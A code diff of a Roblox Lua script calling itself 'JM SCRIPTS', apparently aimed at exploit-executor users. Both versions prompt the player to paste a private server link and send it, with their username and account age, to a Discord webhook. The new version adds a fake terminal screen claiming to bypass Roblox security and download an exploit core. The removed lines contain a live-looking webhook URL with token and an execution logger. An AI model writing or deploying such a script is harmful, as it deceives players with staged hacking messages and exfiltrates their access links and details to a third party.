@@ -1,31 +1,23 @@
---// CONFIG
-local WEBHOOK = "https://discordapp.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
+-- CONFIG
+local WEBHOOK = "COLOQUE_SUA_WEBHOOK_AQUI"
 local DISCORD = "https://discord.gg/ZPz8Renfz"
 
---// SERVICES
+-- SERVICES
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
-local Debris = game:GetService("Debris")
 
 local player = Players.LocalPlayer
 
---// REQUEST
+-- REQUEST
 local request =
 syn and syn.request or
 http_request or
 request or
 fluxus and fluxus.request
 
---// EXECUTOR DETECT
-local executor =
-identifyexecutor and identifyexecutor()
-or (syn and "Synapse")
-or (fluxus and "Fluxus")
-or "Unknown"
-
---// WEBHOOK FUNCTION
-local function sendWebhook(text)
+-- WEBHOOK
+local function sendWebhook(msg)
 
 if not request then return end
 
@@ -34,238 +26,140 @@ Url = WEBHOOK,
 Method = "POST",
 Headers = {["Content-Type"] = "application/json"},
 Body = HttpService:JSONEncode({
-content = text
+content = msg
 })
 })
 
 end
 
---// LOG EXECUTION
-sendWebhook(
-"🚀 **SCRIPT EXECUTADO**\n"..
-"👤 Jogador: `" .. player.Name .. "`\n"..
-"⚙ Executor: `" .. executor .. "`"
-)
-
---// GUI
+-- GUI
 local gui = Instance.new("ScreenGui")
 gui.IgnoreGuiInset = true
 gui.Parent = game.CoreGui
 
---// INTRO
-local intro = Instance.new("Frame",gui)
-intro.Size = UDim2.fromScale(1,1)
-intro.BackgroundColor3 = Color3.new(0,0,0)
+-- TERMINAL FAKE
+local terminal = Instance.new("Frame",gui)
+terminal.Size = UDim2.fromScale(1,1)
+terminal.BackgroundColor3 = Color3.new(0,0,0)
 
-local introText = Instance.new("TextLabel",intro)
-introText.Size = UDim2.fromScale(1,1)
-introText.BackgroundTransparency = 1
-introText.Text = "Obrigado por usar\nJM SCRIPTS 💜"
-introText.TextScaled = true
-introText.Font = Enum.Font.Gotham
-introText.TextColor3 = Color3.fromRGB(200,150,255)
-introText.TextTransparency = 1
+local text = Instance.new("TextLabel",terminal)
+text.Size = UDim2.fromScale(1,1)
+text.BackgroundTransparency = 1
+text.TextColor3 = Color3.fromRGB(0,255,0)
+text.Font = Enum.Font.Code
+text.TextSize = 18
+text.TextXAlignment = Enum.TextXAlignment.Left
+text.TextYAlignment = Enum.TextYAlignment.Top
+text.Text = ""
 
-TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=0}):Play()
-task.wait(2.5)
-TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=1}):Play()
-task.wait(1)
+local fakeLines = {
 
-intro:Destroy()
+"Injecting JM Scripts...",
+"Bypassing Roblox security...",
+"Loading assets...",
+"Decrypting modules...",
+"Connecting to server...",
+"Downloading exploit core...",
+"Verifying environment...",
+"Loading UI framework...",
+"Finalizing execution..."
 
---// LOADING
-local loading = Instance.new("Frame",gui)
-loading.Size = UDim2.fromScale(1,1)
-loading.BackgroundColor3 = Color3.fromRGB(5,5,10)
+}
 
-local barBg = Instance.new("Frame",loading)
-barBg.Size = UDim2.fromScale(0.5,0.03)
-barBg.Position = UDim2.fromScale(0.25,0.55)
-barBg.BackgroundColor3 = Color3.fromRGB(40,40,60)
+for i,v in pairs(fakeLines) do
 
-local bar = Instance.new("Frame",barBg)
-bar.Size = UDim2.fromScale(0,1)
-bar.BackgroundColor3 = Color3.fromRGB(170,90,255)
-
-TweenService:Create(bar,TweenInfo.new(6),{
-Size = UDim2.fromScale(0.95,1)
-}):Play()
-
-task.wait(7)
-
-loading:Destroy()
-
---// MAIN
-local main = Instance.new("Frame",gui)
-main.Size = UDim2.fromScale(1,1)
-main.BackgroundColor3 = Color3.fromRGB(8,8,14)
-
---// RGB BORDER
-local stroke = Instance.new("UIStroke",main)
-stroke.Thickness = 2
-
-task.spawn(function()
-
-local h = 0
-
-while true do
-
-h = (h + 0.01) % 1
-stroke.Color = Color3.fromHSV(h,0.7,1)
-
-task.wait()
+text.Text = text.Text .. "\n> " .. v
+task.wait(0.6)
 
 end
 
-end)
+task.wait(1)
 
---// TITLE
+terminal:Destroy()
+
+-- MAIN PANEL
+local main = Instance.new("Frame",gui)
+main.Size = UDim2.fromOffset(500,300)
+main.Position = UDim2.fromScale(0.5,0.5)
+main.AnchorPoint = Vector2.new(0.5,0.5)
+main.BackgroundColor3 = Color3.fromRGB(15,15,25)
+
+local stroke = Instance.new("UIStroke",main)
+stroke.Color = Color3.fromRGB(200,120,255)
+stroke.Thickness = 2
+
+local corner = Instance.new("UICorner",main)
+
+-- TITLE
 local title = Instance.new("TextLabel",main)
-title.Size = UDim2.fromScale(1,0.15)
+title.Size = UDim2.new(1,0,0,40)
 title.BackgroundTransparency = 1
 title.Text = "JM SCRIPTS"
 title.Font = Enum.Font.GothamBold
-title.TextScaled = true
-title.TextColor3 = Color3.fromRGB(200,150,255)
+title.TextSize = 28
+title.TextColor3 = Color3.fromRGB(220,170,255)
 
---// TITLE GLOW
-task.spawn(function()
+-- PLAYER INFO
+local info = Instance.new("TextLabel",main)
+info.Position = UDim2.new(0,0,0,50)
+info.Size = UDim2.new(1,0,0,60)
+info.BackgroundTransparency = 1
+info.Font = Enum.Font.Gotham
+info.TextSize = 18
+info.TextColor3 = Color3.fromRGB(200,200,200)
 
-while true do
+info.Text =
+"Player: "..player.Name..
+"\nAccount Age: "..player.AccountAge.." days"
 
-TweenService:Create(title,TweenInfo.new(1),{
-TextColor3 = Color3.fromRGB(230,180,255)
-}):Play()
-
-task.wait(1)
-
-TweenService:Create(title,TweenInfo.new(1),{
-TextColor3 = Color3.fromRGB(170,120,255)
-}):Play()
-
-task.wait(1)
-
-end
-
-end)
-
---// INPUT
+-- INPUT
 local box = Instance.new("TextBox",main)
-box.Position = UDim2.fromScale(0.25,0.35)
-box.Size = UDim2.fromScale(0.5,0.07)
-box.PlaceholderText = "Cole o link do servidor privado"
-box.TextScaled = true
+box.Position = UDim2.new(0.1,0,0.45,0)
+box.Size = UDim2.new(0.8,0,0.12,0)
+box.PlaceholderText = "Paste private server link..."
 box.Font = Enum.Font.Gotham
-box.BackgroundColor3 = Color3.fromRGB(20,20,30)
+box.TextSize = 18
+box.BackgroundColor3 = Color3.fromRGB(25,25,40)
 box.TextColor3 = Color3.new(1,1,1)
 
---// SEND BUTTON
+local c2 = Instance.new("UICorner",box)
+
+-- BUTTON
 local send = Instance.new("TextButton",main)
-send.Position = UDim2.fromScale(0.4,0.45)
-send.Size = UDim2.fromScale(0.2,0.07)
-send.Text = "Enviar"
-send.TextScaled = true
+send.Position = UDim2.new(0.35,0,0.65,0)
+send.Size = UDim2.new(0.3,0,0.12,0)
+send.Text = "SEND"
 send.Font = Enum.Font.GothamBold
-send.BackgroundColor3 = Color3.fromRGB(140,80,230)
+send.TextSize = 20
+send.BackgroundColor3 = Color3.fromRGB(160,90,255)
 
---// DISCORD BUTTON
-local discord = Instance.new("TextButton",main)
-discord.Position = UDim2.fromScale(0.4,0.55)
-discord.Size = UDim2.fromScale(0.2,0.06)
-discord.Text = "Entrar no Discord"
-discord.TextScaled = true
-discord.Font = Enum.Font.GothamBold
-discord.BackgroundColor3 = Color3.fromRGB(90,90,255)
+local c3 = Instance.new("UICorner",send)
 
---// HOVER EFFECT
-local function hover(btn)
-
-local original = btn.Size
-
-btn.MouseEnter:Connect(function()
-
-TweenService:Create(btn,TweenInfo.new(0.15),{
-Size = original + UDim2.fromOffset(10,5)
-}):Play()
-
-end)
-
-btn.MouseLeave:Connect(function()
-
-TweenService:Create(btn,TweenInfo.new(0.15),{
-Size = original
-}):Play()
-
-end)
-
-end
-
-hover(send)
-hover(discord)
-
---// CLICK SOUND
-local click = Instance.new("Sound")
-click.SoundId = "rbxassetid://9118828567"
-click.Volume = 0.6
-click.Parent = gui
-
---// SEND LINK
+-- CLICK
 send.MouseButton1Click:Connect(function()
-
-click:Play()
 
 if box.Text == "" then return end
 
 sendWebhook(
-"📩 **NOVO SERVER PRIVADO**\n"..
-"👤 Jogador: `" .. player.Name .. "`\n"..
-"🔗 Link:\n"..box.Text
+"📩 SERVER RECEIVED\n\n"..
+"Player: `" .. player.Name .. "`\n"..
+"Account Age: `" .. player.AccountAge .. " days`\n\n"..
+box.Text
 )
 
-send.Text = "Enviado ✔"
+main:Destroy()
 
-end)
+-- THANK YOU SCREEN
+local thanks = Instance.new("Frame",gui)
+thanks.Size = UDim2.fromScale(1,1)
+thanks.BackgroundColor3 = Color3.new(0,0,0)
 
---// DISCORD BUTTON
-discord.MouseButton1Click:Connect(function()
-
-click:Play()
-
-if setclipboard then
-setclipboard(DISCORD)
-discord.Text = "Link copiado ✔"
-end
-
-end)
-
---// SPARK PARTICLES
-task.spawn(function()
-
-while true do
-
-local spark = Instance.new("Frame")
-spark.Parent = main
-spark.Size = UDim2.fromOffset(3,3)
-spark.Position = UDim2.new(math.random(),0,1.1,0)
-spark.BackgroundColor3 = Color3.fromRGB(200,120,255)
-spark.BorderSizePixel = 0
-
-local c = Instance.new("UICorner",spark)
-c.CornerRadius = UDim.new(1,0)
-
-TweenService:Create(
-spark,
-TweenInfo.new(math.random(4,7)),
-{
-Position = UDim2.new(spark.Position.X.Scale,0,-0.2,0),
-BackgroundTransparency = 1
-}
-):Play()
-
-Debris:AddItem(spark,7)
-
-task.wait(0.12)
-
-end
+local t = Instance.new("TextLabel",thanks)
+t.Size = UDim2.fromScale(1,1)
+t.BackgroundTransparency = 1
+t.Font = Enum.Font.GothamBold
+t.TextScaled = true
+t.TextColor3 = Color3.fromRGB(200,160,255)
+t.Text = "Obrigado por usar\nJM Scripts 💜"
 
 end)
